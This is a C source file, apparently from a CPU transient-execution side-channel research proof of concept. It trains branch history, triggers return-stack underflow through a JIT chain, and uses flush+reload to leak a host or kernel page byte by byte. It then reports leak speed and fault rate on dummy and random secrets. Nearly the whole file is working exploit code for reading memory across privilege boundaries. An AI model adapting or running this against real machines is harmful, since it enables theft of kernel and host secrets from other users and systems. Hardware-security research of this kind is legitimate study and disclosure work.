#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/time.h>

#include "lib.h"
#include "common.h"
#include "flush_and_reload.h"
#include "helper.h"

extern void enter_jit_chain(void * jit_entry, void * caller_function,
                    void * target_function, void * fr_buf_p, void * do_rsb_underflow,
                    void * jmp_history);


int leak_byte_forwards(struct config * cfg, uint64_t prefix) {

    uint64_t fr_offset;
    uint64_t hits[N_FR_BUF] = {};

    for (size_t outer = 0; outer < 10; outer++)
    {
        for (uint64_t byte = 0x0; byte <= 0xff; byte++) {


            fr_offset = (byte << 56);

            cfg->host_arg_fr_buf = cfg->host_fr_buf - fr_offset - prefix;

            do_flush_and_reload(cfg, hits, 2);
            // exit(0);
            if (hits[0] > 0) {
                return (int) byte;
            }
        }

    }

    return -1;

}

#define LEAK_RATE_TEST_SIZE_USER 128

void leak_test_leakage_rate(struct config * cfg) {

    printf("------------------------------------------------------\n");
    printf("Testing leakage rate from user\n");
    printf("------------------------------------------------------\n");

    uint8_t *secret = cfg->secret_page;
    uint8_t *secret_host = cfg->host_secret_page;


    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE_USER; i++) {
        cfg->secret_page[i] = (uint8_t) rand();
    }
    memset(cfg->secret_page, 0, 7); // First 7 bytes are zero to start the leak


    uint8_t * leaked_bytes = calloc(1, 1 << 20);


    // ------------------------------------------------------------------------
    // Start the leak

    uint64_t prefix;
    int found;

    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 7;

    // prefix = *(uint64_t *) (cur_byte - 7);

    printf("[%50s]", "");
    int step = 0;
    fflush(stdout);

    struct timeval t0, t1;
    gettimeofday(&t0, NULL);

    for (size_t outer = 0; outer < 1; outer++)
    {

        cfg->host_arg_secret = secret_host;


        for (size_t i = 0; i < LEAK_RATE_TEST_SIZE_USER; i++)
        {

            prefix = *(uint64_t *) (cur_byte - 7);

            found = leak_byte_forwards(cfg, prefix);

            size_t iter = 0;
            while (found == -1 ) {
                found = leak_byte_forwards(cfg, prefix);

                iter++;
                if (iter == 1000) {
                    printf("\nStuck! at %p\n", cfg->host_arg_secret);
                    return;
                }
            }
            *cur_byte = found;

            cur_byte += 1;
            cfg->host_arg_secret += 1;

            if (i % (LEAK_RATE_TEST_SIZE_USER / 50) == 0) {
                step++;
                printf("\r[%.*s", step, "..................................................");
                fflush(stdout);
            }

        }
    }

    gettimeofday(&t1, NULL);
    uint64_t delta_us = (t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_usec - t0.tv_usec);

    printf("\n%d kB took %4.1f seconds (%5.1f Byte/sec)\n", LEAK_RATE_TEST_SIZE_USER / 1024, (double) delta_us / 1000000, LEAK_RATE_TEST_SIZE_USER / ( (double) delta_us / 1000000));

    // ------------------------------------------------------------------------
    // Verify for any faults

    uint64_t incorrect = 0;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE_USER; i++)
    {
        if (secret[i] != leaked_bytes[i]) {
            incorrect += 1;
        }
    }

    printf("Fault rate: %05.3f%%\n", ((double) incorrect / LEAK_RATE_TEST_SIZE_USER) * 100);

    fflush(stdout);


}

#define DUMMY_SECRET_LENGTH 33

void leak_dummy_secret(struct config * cfg) {

    // ------------------------------------------------------------------------
    // We setup a dummy secret and try to leak it

    printf("------------------------------------------------------\n");
    printf("Leaking a dummy secret...\n");
    printf("------------------------------------------------------\n");

    // Initialize secret
    uint8_t *secret = cfg->secret_page;
    cfg->host_arg_secret = cfg->host_secret_page;

    memset(secret, 0x0, 7);

    // To test the zero extend prefix

    for (size_t i = 7; i < DUMMY_SECRET_LENGTH; i++) {
        secret[i] = (uint8_t) ('A' + i - 7);
    }

    printf("%15s: 0x%016lx\n", "secret addr user", (uint64_t)secret);
    printf("%15s: 0x%016lx\n", "secret addr host", (uint64_t)cfg->host_secret_page);


    uint8_t leaked_bytes[DUMMY_SECRET_LENGTH] = {0};
    uint64_t prefix;
    int found;

    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 7;

    prefix = *(uint64_t *) (cur_byte - 7);


    for (unsigned i = 7; i < DUMMY_SECRET_LENGTH; i++)
    {
        prefix = *(uint64_t *) (cur_byte - 7);


        found = leak_byte_forwards(cfg, prefix);

        size_t iter = 0;
        while (found == -1 ) {
            found = leak_byte_forwards(cfg, prefix);

            iter++;
            if (iter == 1000) {
                printf("\nStuck! at %p\n", cfg->host_arg_secret);
                return;
            }
        }

        *cur_byte = found;

        printf("0x%lx: Found Byte: 0x%02x (%c) Used prefix: 0x%08lx\n", (uint64_t) cfg->host_arg_secret + i, *cur_byte, *cur_byte, prefix);

        cur_byte += 1;
        cfg->host_arg_secret += 1;

    }

}

static int execute_kernel_page_leak(config * cfg, uint8_t * leaked_bytes) {

    char buf[17];
    void * args[13];
    int ret;
    uint8_t * history;
    uint8_t * jit_entry;
    uint8_t rsb_underflow;
    uint8_t history_type;

    args[0] = enter_jit_chain;
    args[1] = cfg->caller0;
    args[2] = 0;
    args[3] = 0; // &cfg->target0; train_target (not needed, direct jump)
    args[4] = cfg->fr_buf_p;  // used by the train_target
    args[5] = 0;
    args[6] = 0;

    args[7] = cfg->fr_buf[0];   // used for F+R
    args[8] = cfg->secret_page;
    args[9] = cfg->host_fr_buf;
    args[10] = cfg->host_secret_page;
    args[11] = leaked_bytes;

    // initialize eviction list
    void * evict_list[MAX_CALLER_EVICT_PC_SET + 1] = {0};

    for (int i = 0; i < MAX_CALLER_EVICT_PC_SET; i++)
    {
        if (cfg->caller_evict_list_pc[i] == 0) {
            break;
        }

        evict_list[i] = cfg->caller_evict_list_pc[i];
    }

    args[12] =  evict_list;


    snprintf(buf, 17, "%lx", (size_t) args);

    ret = pwrite(cfg->fd_leak_page, buf, sizeof(buf), 0);

    if (ret <= 0) {
        printf("[ERROR] Kernel leak_page failed: %s (%d)\n", strerror(errno), errno);
        exit(EXIT_FAILURE);
    }

    cpuid();

    return 0;

}


#define LEAK_RATE_TEST_SIZE_KERNEL 0x1000


void test_kernel_leakage_rate(struct config * cfg) {

    printf("------------------------------------------------------\n");
    printf("Testing leakage rate from kernel\n");
    printf("------------------------------------------------------\n");

    uint8_t * leaked_bytes = calloc(1, 4096);

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE_KERNEL; i++) {
        cfg->secret_page[i] = (uint8_t) rand();
    }
    memset(cfg->secret_page, 0, 7); // First 7 bytes are zero to start the leak

    struct timeval t0, t1;
    gettimeofday(&t0, NULL);

    // Leak the page in kernel
    execute_kernel_page_leak(cfg, leaked_bytes);

    gettimeofday(&t1, NULL);
    uint64_t delta_us = (t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_usec - t0.tv_usec);

    printf("\n%d kB took %4.1f seconds (%5.1f Byte/sec)\n", LEAK_RATE_TEST_SIZE_KERNEL / 1024, (double) delta_us / 1000000, LEAK_RATE_TEST_SIZE_KERNEL / ( (double) delta_us / 1000000));


    uint64_t incorrect = 0;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE_KERNEL; i++)
    {
        if (cfg->secret_page[i] != leaked_bytes[i]) {
            incorrect += 1;
        }
    }

    printf("Fault rate: %05.3f%%\n", ((double) incorrect / LEAK_RATE_TEST_SIZE_KERNEL) * 100);


    free(leaked_bytes);

}
